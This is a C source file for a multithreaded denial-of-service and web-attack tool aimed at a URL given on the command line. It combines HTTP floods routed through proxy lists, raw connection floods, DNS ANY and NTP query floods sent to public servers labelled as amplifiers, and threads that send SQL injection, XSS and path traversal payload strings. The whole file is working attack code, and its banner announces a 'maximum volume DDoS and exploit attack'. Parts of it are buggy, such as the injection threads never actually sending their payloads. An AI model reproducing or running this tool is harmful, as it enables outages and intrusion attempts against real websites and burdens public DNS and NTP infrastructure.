#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define MAX_THREADS 10000
#define MAX_PROXIES 100000
#define BUFFER_SIZE 4096
#define USER_AGENTS_COUNT 5
#define TARGETS_COUNT 10
#define PAYLOADS_COUNT 20
#define TIMEOUT 2

// Global variables
char *target_url;
char *target_host;
int target_port;
int use_ssl = 0;
int duration = 300;
int threads = 1000;
int running = 1;
long long requests_sent = 0;
long long successful_requests = 0;
long long failed_requests = 0;
double peak_rps = 0.0;
time_t start_time;

// Proxy structure
typedef struct {
    char ip[16];
    int port;
    int working;
} Proxy;

Proxy proxies[MAX_PROXIES];
int proxy_count = 0;

// User agents
const char *user_agents[USER_AGENTS_COUNT] = {
    "M/5.0",
    "C/91.0",
    "F/89.0",
    "S/14.1",
    "E/91.0"
};

// DDoS payloads
const char *payloads[PAYLOADS_COUNT] = {
    "/",
    "/index.html",
    "/admin",
    "/login",
    "/wp-admin",
    "/phpmyadmin",
    "/api/v1/users",
    "/api/v1/data",
    "/search?q=test",
    "/?id=1",
    "/cart/add",
    "/checkout",
    "/wishlist/add",
    "/review",
    "/contact",
    "/register",
    "/blog",
    "/products",
    "/services",
    "/about"
};

// Exploit payloads
const char *sql_injection_payloads[] = {
    "' OR SLEEP(5)--",
    "' UNION SELECT NULL,username,password FROM users--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
    "' OR 1=1--",
    "'; DROP TABLE users--"
};

const char *xss_payloads[] = {
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<svg onload=alert(document.domain)>",
    "javascript:alert(document.cookie)"
};

const char *path_traversal_payloads[] = {
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "/var/www/html/../../../etc/passwd"
};

// DNS amplification servers
const char *dns_servers[] = {
    "8.8.8.8",
    "8.8.4.4",
    "1.1.1.1",
    "1.0.0.1",
    "9.9.9.9",
    "208.67.222.222",
    "208.67.220.220",
    "64.6.64.6",
    "64.6.65.6"
};

// NTP amplification servers
const char *ntp_servers[] = {
    "0.pool.ntp.org",
    "1.pool.ntp.org",
    "2.pool.ntp.org",
    "3.pool.ntp.org",
    "cn.pool.ntp.org",
    "europe.pool.ntp.org",
    "asia.pool.ntp.org",
    "oceania.pool.ntp.org"
};

// Function prototypes
void parse_url(const char *url);
void load_proxies(const char *filename);
void *stats_collector(void *arg);
void *ultra_fast_http_flood(void *arg);
void *raw_socket_flood(void *arg);
void *dns_amplification_attack(void *arg);
void *ntp_amplification_attack(void *arg);
void *sql_injection_attack(void *arg);
void *xss_attack(void *arg);
void *path_traversal_attack(void *arg);
int create_socket();
int connect_through_proxy(int sock, const char *proxy_ip, int proxy_port);
int send_http_request(int sock, const char *payload);
int send_https_request(int sock, const char *payload, SSL **ssl);
void signal_handler(int sig);

// Signal handler
void signal_handler(int sig) {
    running = 0;
}

// Parse URL
void parse_url(const char *url) {
    char protocol[10];
    char host[256];
    int port = 80;
    
    sscanf(url, "%9[^:]://%255[^:]:%d", protocol, host, &port);
    
    if (strlen(protocol) == 0) {
        sscanf(url, "%255[^:]:%d", host, &port);
        strcpy(protocol, "http");
    } else if (port == 80) {
        sscanf(url, "%9[^:]://%255[^/]", protocol, host);
    }
    
    target_host = strdup(host);
    target_port = port;
    
    if (strcmp(protocol, "https") == 0) {
        use_ssl = 1;
        if (port == 80) {
            target_port = 443;
        }
    }
}

// Load proxies from file
void load_proxies(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf("Failed to open proxy file: %s\n", filename);
        return;
    }
    
    char line[256];
    while (fgets(line, sizeof(line), file) && proxy_count < MAX_PROXIES) {
        char ip[16];
        int port;
        
        if (sscanf(line, "%15[^:]:%d", ip, &port) == 2) {
            strcpy(proxies[proxy_count].ip, ip);
            proxies[proxy_count].port = port;
            proxies[proxy_count].working = 1;
            proxy_count++;
        }
    }
    
    fclose(file);
    printf("Loaded %d proxies\n", proxy_count);
}

// Stats collector thread
void *stats_collector(void *arg) {
    time_t last_update = start_time;
    long long last_requests = 0;
    
    while (running) {
        time_t current_time = time(NULL);
        double elapsed = difftime(current_time, start_time);
        
        if (elapsed > 0) {
            double current_rps = requests_sent / elapsed;
            if (current_rps > peak_rps) {
                peak_rps = current_rps;
            }
            
            // Print stats every 5 seconds
            if (difftime(current_time, last_update) >= 5.0) {
                double interval_rps = (requests_sent - last_requests) / 5.0;
                printf("\r[*] Requests: %lld | RPS: %.2f | Peak RPS: %.2f | Success: %lld | Failed: %lld", 
                       requests_sent, current_rps, peak_rps, successful_requests, failed_requests);
                fflush(stdout);
                
                last_update = current_time;
                last_requests = requests_sent;
            }
        }
        
        usleep(100000); // Sleep for 100ms
    }
    
    return NULL;
}

// Create socket
int create_socket() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket()");
        return -1;
    }
    
    // Set socket options
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    // Set timeout
    struct timeval tv;
    tv.tv_sec = TIMEOUT;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
    
    return sock;
}

// Connect through proxy
int connect_through_proxy(int sock, const char *proxy_ip, int proxy_port) {
    struct sockaddr_in proxy_addr;
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy_port);
    
    if (inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr) <= 0) {
        return -1;
    }
    
    if (connect(sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
        return -1;
    }
    
    // Send CONNECT request
    char connect_req[BUFFER_SIZE];
    snprintf(connect_req, sizeof(connect_req), "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n", 
             target_host, target_port, target_host, target_port);
    
    if (send(sock, connect_req, strlen(connect_req), 0) < 0) {
        return -1;
    }
    
    // Receive response
    char response[BUFFER_SIZE];
    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    if (bytes_received <= 0) {
        return -1;
    }
    
    response[bytes_received] = '\0';
    
    // Check if connection was successful
    if (strstr(response, "200 Connection established") == NULL) {
        return -1;
    }
    
    return 0;
}

// Send HTTP request
int send_http_request(int sock, const char *payload) {
    char request[BUFFER_SIZE];
    
    snprintf(request, sizeof(request), 
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Accept: */*\r\n"
             "Connection: close\r\n"
             "\r\n",
             payload, target_host, user_agents[rand() % USER_AGENTS_COUNT]);
    
    if (send(sock, request, strlen(request), 0) < 0) {
        return -1;
    }
    
    // Receive response (just check status code)
    char response[BUFFER_SIZE];
    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    if (bytes_received <= 0) {
        return -1;
    }
    
    response[bytes_received] = '\0';
    
    // Check if response is valid
    if (strstr(response, "HTTP/") == NULL) {
        return -1;
    }
    
    // Check status code
    int status_code = atoi(response + 9);
    if (status_code >= 200 && status_code < 300) {
        return 0; // Success
    }
    
    return -1; // Failed
}

// Send HTTPS request
int send_https_request(int sock, const char *payload, SSL **ssl) {
    SSL_CTX *ctx;
    SSL *ssl_conn;
    
    // Initialize SSL
    SSL_library_init();
    SSL_load_error_strings();
    ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ctx) {
        return -1;
    }
    
    ssl_conn = SSL_new(ctx);
    if (!ssl_conn) {
        SSL_CTX_free(ctx);
        return -1;
    }
    
    SSL_set_fd(ssl_conn, sock);
    
    // Connect SSL
    if (SSL_connect(ssl_conn) <= 0) {
        SSL_free(ssl_conn);
        SSL_CTX_free(ctx);
        return -1;
    }
    
    // Send request
    char request[BUFFER_SIZE];
    
    snprintf(request, sizeof(request), 
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Accept: */*\r\n"
             "Connection: close\r\n"
             "\r\n",
             payload, target_host, user_agents[rand() % USER_AGENTS_COUNT]);
    
    if (SSL_write(ssl_conn, request, strlen(request)) <= 0) {
        SSL_free(ssl_conn);
        SSL_CTX_free(ctx);
        return -1;
    }
    
    // Receive response (just check status code)
    char response[BUFFER_SIZE];
    int bytes_received = SSL_read(ssl_conn, response, sizeof(response) - 1);
    if (bytes_received <= 0) {
        SSL_free(ssl_conn);
        SSL_CTX_free(ctx);
        return -1;
    }
    
    response[bytes_received] = '\0';
    
    // Check if response is valid
    if (strstr(response, "HTTP/") == NULL) {
        SSL_free(ssl_conn);
        SSL_CTX_free(ctx);
        return -1;
    }
    
    // Check status code
    int status_code = atoi(response + 9);
    if (status_code >= 200 && status_code < 300) {
        *ssl = ssl_conn;
        return 0; // Success
    }
    
    SSL_free(ssl_conn);
    SSL_CTX_free(ctx);
    return -1; // Failed
}

// Ultra fast HTTP flood thread
void *ultra_fast_http_flood(void *arg) {
    while (running) {
        int sock = create_socket();
        if (sock < 0) {
            continue;
        }
        
        // Connect directly or through proxy
        int connected = 0;
        SSL *ssl = NULL;
        
        if (proxy_count > 0 && rand() % 2 == 0) {
            // Use proxy
            Proxy *proxy = &proxies[rand() % proxy_count];
            if (connect_through_proxy(sock, proxy->ip, proxy->port) == 0) {
                connected = 1;
            }
        } else {
            // Connect directly
            struct sockaddr_in target_addr;
            memset(&target_addr, 0, sizeof(target_addr));
            target_addr.sin_family = AF_INET;
            target_addr.sin_port = htons(target_port);
            
            if (inet_pton(AF_INET, target_host, &target_addr.sin_addr) <= 0) {
                struct hostent *host = gethostbyname(target_host);
                if (host == NULL) {
                    close(sock);
                    continue;
                }
                memcpy(&target_addr.sin_addr, host->h_addr, host->h_length);
            }
            
            if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
                connected = 1;
            }
        }
        
        if (connected) {
            // Send request
            const char *payload = payloads[rand() % PAYLOADS_COUNT];
            int result;
            
            if (use_ssl) {
                result = send_https_request(sock, payload, &ssl);
                if (ssl) {
                    SSL_free(ssl);
                }
            } else {
                result = send_http_request(sock, payload);
            }
            
            // Update stats
            __sync_fetch_and_add(&requests_sent, 1);
            if (result == 0) {
                __sync_fetch_and_add(&successful_requests, 1);
            } else {
                __sync_fetch_and_add(&failed_requests, 1);
            }
        } else {
            __sync_fetch_and_add(&failed_requests, 1);
        }
        
        close(sock);
    }
    
    return NULL;
}

// Raw socket flood thread
void *raw_socket_flood(void *arg) {
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }
        
        // Set socket options
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        
        // Connect to target
        struct sockaddr_in target_addr;
        memset(&target_addr, 0, sizeof(target_addr));
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(target_port);
        
        if (inet_pton(AF_INET, target_host, &target_addr.sin_addr) <= 0) {
            struct hostent *host = gethostbyname(target_host);
            if (host == NULL) {
                close(sock);
                continue;
            }
            memcpy(&target_addr.sin_addr, host->h_addr, host->h_length);
        }
        
        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
            // Send minimal HTTP request
            const char *payload = payloads[rand() % PAYLOADS_COUNT];
            char request[BUFFER_SIZE];
            
            snprintf(request, sizeof(request), 
                     "GET %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: M/5.0\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     payload, target_host);
            
            if (send(sock, request, strlen(request), 0) > 0) {
                __sync_fetch_and_add(&requests_sent, 1);
                __sync_fetch_and_add(&successful_requests, 1);
            } else {
                __sync_fetch_and_add(&failed_requests, 1);
            }
        } else {
            __sync_fetch_and_add(&failed_requests, 1);
        }
        
        close(sock);
    }
    
    return NULL;
}

// DNS amplification attack thread
void *dns_amplification_attack(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        return NULL;
    }
    
    while (running) {
        // Create DNS query
        char dns_packet[512];
        memset(dns_packet, 0, sizeof(dns_packet));
        
        // DNS header
        dns_packet[0] = rand() % 256;  // Transaction ID (high byte)
        dns_packet[1] = rand() % 256;  // Transaction ID (low byte)
        dns_packet[2] = 0x01;        // Flags (standard query)
        dns_packet[3] = 0x00;        // Flags
        dns_packet[4] = 0x00;        // Questions (high byte)
        dns_packet[5] = 0x01;        // Questions (low byte)
        dns_packet[6] = 0x00;        // Answer RRs (high byte)
        dns_packet[7] = 0x00;        // Answer RRs (low byte)
        dns_packet[8] = 0x00;        // Authority RRs (high byte)
        dns_packet[9] = 0x00;        // Authority RRs (low byte)
        dns_packet[10] = 0x00;       // Additional RRs (high byte)
        dns_packet[11] = 0x00;       // Additional RRs (low byte)
        
        // DNS question (ANY query for google.com)
        int pos = 12;
        const char *domain = "google.com";
        const char *part = domain;
        while (*part) {
            const char *dot = strchr(part, '.');
            int length = dot ? (dot - part) : strlen(part);
            
            dns_packet[pos++] = length;
            memcpy(&dns_packet[pos], part, length);
            pos += length;
            
            if (dot) {
                part = dot + 1;
            } else {
                break;
            }
        }
        dns_packet[pos++] = 0;  // End of domain name
        
        dns_packet[pos++] = 0x00;  // Type (high byte)
        dns_packet[pos++] = 0xFF;  // Type (low byte) - ANY
        dns_packet[pos++] = 0x00;  // Class (high byte)
        dns_packet[pos++] = 0x01;  // Class (low byte) - IN
        
        // Send to DNS server
        const char *dns_server = dns_servers[rand() % (sizeof(dns_servers) / sizeof(dns_servers[0]))];
        
        struct sockaddr_in dns_addr;
        memset(&dns_addr, 0, sizeof(dns_addr));
        dns_addr.sin_family = AF_INET;
        dns_addr.sin_port = htons(53);
        
        if (inet_pton(AF_INET, dns_server, &dns_addr.sin_addr) <= 0) {
            struct hostent *host = gethostbyname(dns_server);
            if (host == NULL) {
                continue;
            }
            memcpy(&dns_addr.sin_addr, host->h_addr, host->h_length);
        }
        
        if (sendto(sock, dns_packet, pos, 0, (struct sockaddr*)&dns_addr, sizeof(dns_addr)) > 0) {
            __sync_fetch_and_add(&requests_sent, 1);
            __sync_fetch_and_add(&successful_requests, 1);
        } else {
            __sync_fetch_and_add(&failed_requests, 1);
        }
        
        usleep(1000);  // Sleep for 1ms to avoid flooding the network
    }
    
    close(sock);
    return NULL;
}

// NTP amplification attack thread
void *ntp_amplification_attack(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        return NULL;
    }
    
    while (running) {
        // Create NTP request
        char ntp_packet[48];
        memset(ntp_packet, 0, sizeof(ntp_packet));
        
        // NTP header
        ntp_packet[0] = 0x1B;  // NTP version 4, mode 3 (client)
        
        // Send to NTP server
        const char *ntp_server = ntp_servers[rand() % (sizeof(ntp_servers) / sizeof(ntp_servers[0]))];
        
        struct sockaddr_in ntp_addr;
        memset(&ntp_addr, 0, sizeof(ntp_addr));
        ntp_addr.sin_family = AF_INET;
        ntp_addr.sin_port = htons(123);
        
        if (inet_pton(AF_INET, ntp_server, &ntp_addr.sin_addr) <= 0) {
            struct hostent *host = gethostbyname(ntp_server);
            if (host == NULL) {
                continue;
            }
            memcpy(&ntp_addr.sin_addr, host->h_addr, host->h_length);
        }
        
        if (sendto(sock, ntp_packet, sizeof(ntp_packet), 0, (struct sockaddr*)&ntp_addr, sizeof(ntp_addr)) > 0) {
            __sync_fetch_and_add(&requests_sent, 1);
            __sync_fetch_and_add(&successful_requests, 1);
        } else {
            __sync_fetch_and_add(&failed_requests, 1);
        }
        
        usleep(1000);  // Sleep for 1ms to avoid flooding the network
    }
    
    close(sock);
    return NULL;
}

// SQL injection attack thread
void *sql_injection_attack(void *arg) {
    while (running) {
        int sock = create_socket();
        if (sock < 0) {
            continue;
        }
        
        // Connect directly or through proxy
        int connected = 0;
        SSL *ssl = NULL;
        
        if (proxy_count > 0 && rand() % 2 == 0) {
            // Use proxy
            Proxy *proxy = &proxies[rand() % proxy_count];
            if (connect_through_proxy(sock, proxy->ip, proxy->port) == 0) {
                connected = 1;
            }
        } else {
            // Connect directly
            struct sockaddr_in target_addr;
            memset(&target_addr, 0, sizeof(target_addr));
            target_addr.sin_family = AF_INET;
            target_addr.sin_port = htons(target_port);
            
            if (inet_pton(AF_INET, target_host, &target_addr.sin_addr) <= 0) {
                struct hostent *host = gethostbyname(target_host);
                if (host == NULL) {
                    close(sock);
                    continue;
                }
                memcpy(&target_addr.sin_addr, host->h_addr, host->h_length);
            }
            
            if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
                connected = 1;
            }
        }
        
        if (connected) {
            // Send SQL injection payload
            const char *payload = sql_injection_payloads[rand() % (sizeof(sql_injection_payloads) / sizeof(sql_injection_payloads[0]))];
            char request[BUFFER_SIZE];
            
            snprintf(request, sizeof(request), 
                     "GET /?id=%s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: */*\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     payload, target_host, user_agents[rand() % USER_AGENTS_COUNT]);
            
            int result;
            
            if (use_ssl) {
                result = send_https_request(sock, "/?id=", &ssl);
                if (ssl) {
                    SSL_free(ssl);
                }
            } else {
                result = send_http_request(sock, "/?id=");
            }
            
            // Update stats
            __sync_fetch_and_add(&requests_sent, 1);
            if (result == 0) {
                __sync_fetch_and_add(&successful_requests, 1);
            } else {
                __sync_fetch_and_add(&failed_requests, 1);
            }
        } else {
            __sync_fetch_and_add(&failed_requests, 1);
        }
        
        close(sock);
    }
    
    return NULL;
}

// XSS attack thread
void *xss_attack(void *arg) {
    while (running) {
        int sock = create_socket();
        if (sock < 0) {
            continue;
        }
        
        // Connect directly or through proxy
        int connected = 0;
        SSL *ssl = NULL;
        
        if (proxy_count > 0 && rand() % 2 == 0) {
            // Use proxy
            Proxy *proxy = &proxies[rand() % proxy_count];
            if (connect_through_proxy(sock, proxy->ip, proxy->port) == 0) {
                connected = 1;
            }
        } else {
            // Connect directly
            struct sockaddr_in target_addr;
            memset(&target_addr, 0, sizeof(target_addr));
            target_addr.sin_family = AF_INET;
            target_addr.sin_port = htons(target_port);
            
            if (inet_pton(AF_INET, target_host, &target_addr.sin_addr) <= 0) {
                struct hostent *host = gethostbyname(target_host);
                if (host == NULL) {
                    close(sock);
                    continue;
                }
                memcpy(&target_addr.sin_addr, host->h_addr, host->h_length);
            }
            
            if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
                connected = 1;
            }
        }
        
        if (connected) {
            // Send XSS payload
            const char *payload = xss_payloads[rand() % (sizeof(xss_payloads) / sizeof(xss_payloads[0]))];
            char request[BUFFER_SIZE];
            
            snprintf(request, sizeof(request), 
                     "GET /?search=%s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: */*\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     payload, target_host, user_agents[rand() % USER_AGENTS_COUNT]);
            
            int result;
            
            if (use_ssl) {
                result = send_https_request(sock, "/?search=", &ssl);
                if (ssl) {
                    SSL_free(ssl);
                }
            } else {
                result = send_http_request(sock, "/?search=");
            }
            
            // Update stats
            __sync_fetch_and_add(&requests_sent, 1);
            if (result == 0) {
                __sync_fetch_and_add(&successful_requests, 1);
            } else {
                __sync_fetch_and_add(&failed_requests, 1);
            }
        } else {
            __sync_fetch_and_add(&failed_requests, 1);
        }
        
        close(sock);
    }
    
    return NULL;
}

// Path traversal attack thread
void *path_traversal_attack(void *arg) {
    while (running) {
        int sock = create_socket();
        if (sock < 0) {
            continue;
        }
        
        // Connect directly or through proxy
        int connected = 0;
        SSL *ssl = NULL;
        
        if (proxy_count > 0 && rand() % 2 == 0) {
            // Use proxy
            Proxy *proxy = &proxies[rand() % proxy_count];
            if (connect_through_proxy(sock, proxy->ip, proxy->port) == 0) {
                connected = 1;
            }
        } else {
            // Connect directly
            struct sockaddr_in target_addr;
            memset(&target_addr, 0, sizeof(target_addr));
            target_addr.sin_family = AF_INET;
            target_addr.sin_port = htons(target_port);
            
            if (inet_pton(AF_INET, target_host, &target_addr.sin_addr) <= 0) {
                struct hostent *host = gethostbyname(target_host);
                if (host == NULL) {
                    close(sock);
                    continue;
                }
                memcpy(&target_addr.sin_addr, host->h_addr, host->h_length);
            }
            
            if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
                connected = 1;
            }
        }
        
        if (connected) {
            // Send path traversal payload
            const char *payload = path_traversal_payloads[rand() % (sizeof(path_traversal_payloads) / sizeof(path_traversal_payloads[0]))];
            char request[BUFFER_SIZE];
            
            snprintf(request, sizeof(request), 
                     "GET /?file=%s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: */*\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     payload, target_host, user_agents[rand() % USER_AGENTS_COUNT]);
            
            int result;
            
            if (use_ssl) {
                result = send_https_request(sock, "/?file=", &ssl);
                if (ssl) {
                    SSL_free(ssl);
                }
            } else {
                result = send_http_request(sock, "/?file=");
            }
            
            // Update stats
            __sync_fetch_and_add(&requests_sent, 1);
            if (result == 0) {
                __sync_fetch_and_add(&successful_requests, 1);
            } else {
                __sync_fetch_and_add(&failed_requests, 1);
            }
        } else {
            __sync_fetch_and_add(&failed_requests, 1);
        }
        
        close(sock);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    // Parse command line arguments
    if (argc < 2) {
        printf("Usage: %s <URL> [options]\n", argv[0]);
        printf("Options:\n");
        printf("  -d <duration>   Attack duration in seconds (default: 300)\n");
        printf("  -t <threads>    Number of threads (default: 1000)\n");
        printf("  -p <file>       Proxy file (one per line, format: IP:PORT)\n");
        printf("  -o <file>       Output file for results\n");
        return 1;
    }
    
    target_url = argv[1];
    
    // Parse other arguments
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            duration = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            threads = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            load_proxies(argv[++i]);
        } else if (strcmp(argv[i], "-o") == 0 && i + 1 < argc) {
            // Output file (not implemented in this version)
            i++;
        }
    }
    
    // Parse URL
    parse_url(target_url);
    
    printf("[*] Starting maximum volume DDoS and exploit attack on %s\n", target_url);
    printf("[*] Target: %s:%d (%s)\n", target_host, target_port, use_ssl ? "HTTPS" : "HTTP");
    printf("[*] Duration: %d seconds\n", duration);
    printf("[*] Threads: %d\n", threads);
    printf("[*] Proxies: %d\n", proxy_count);
    
    // Set up signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Start time
    start_time = time(NULL);
    
    // Start stats collector thread
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, stats_collector, NULL);
    
    // Start attack threads
    pthread_t attack_threads[MAX_THREADS];
    int thread_count = 0;
    
    // Start ultra fast HTTP flood threads (40% of threads)
    int http_threads = threads * 0.4;
    for (int i = 0; i < http_threads && thread_count < MAX_THREADS; i++) {
        pthread_create(&attack_threads[thread_count++], NULL, ultra_fast_http_flood, NULL);
    }
    
    // Start raw socket flood threads (20% of threads)
    int raw_threads = threads * 0.2;
    for (int i = 0; i < raw_threads && thread_count < MAX_THREADS; i++) {
        pthread_create(&attack_threads[thread_count++], NULL, raw_socket_flood, NULL);
    }
    
    // Start DNS amplification attack threads (10% of threads)
    int dns_threads = threads * 0.1;
    for (int i = 0; i < dns_threads && thread_count < MAX_THREADS; i++) {
        pthread_create(&attack_threads[thread_count++], NULL, dns_amplification_attack, NULL);
    }
    
    // Start NTP amplification attack threads (10% of threads)
    int ntp_threads = threads * 0.1;
    for (int i = 0; i < ntp_threads && thread_count < MAX_THREADS; i++) {
        pthread_create(&attack_threads[thread_count++], NULL, ntp_amplification_attack, NULL);
    }
    
    // Start SQL injection attack threads (5% of threads)
    int sql_threads = threads * 0.05;
    for (int i = 0; i < sql_threads && thread_count < MAX_THREADS; i++) {
        pthread_create(&attack_threads[thread_count++], NULL, sql_injection_attack, NULL);
    }
    
    // Start XSS attack threads (5% of threads)
    int xss_threads = threads * 0.05;
    for (int i = 0; i < xss_threads && thread_count < MAX_THREADS; i++) {
        pthread_create(&attack_threads[thread_count++], NULL, xss_attack, NULL);
    }
    
    // Start path traversal attack threads (5% of threads)
    int path_threads = threads * 0.05;
    for (int i = 0; i < path_threads && thread_count < MAX_THREADS; i++) {
        pthread_create(&attack_threads[thread_count++], NULL, path_traversal_attack, NULL);
    }
    
    printf("[*] Started %d attack threads\n", thread_count);
    
    // Wait for attack duration
    sleep(duration);
    
    // Stop attack
    running = 0;
    
    // Wait for threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(attack_threads[i], NULL);
    }
    
    // Wait for stats collector thread
    pthread_join(stats_thread, NULL);
    
    // Calculate statistics
    double elapsed = difftime(time(NULL), start_time);
    double avg_rps = requests_sent / elapsed;
    
    printf("\n[*] Attack completed\n");
    printf("[*] Total requests: %lld\n", requests_sent);
    printf("[*] Successful requests: %lld\n", successful_requests);
    printf("[*] Failed requests: %lld\n", failed_requests);
    printf("[*] Average RPS: %.2f\n", avg_rps);
    printf("[*] Peak RPS: %.2f\n", peak_rps);
    
    return 0;
}
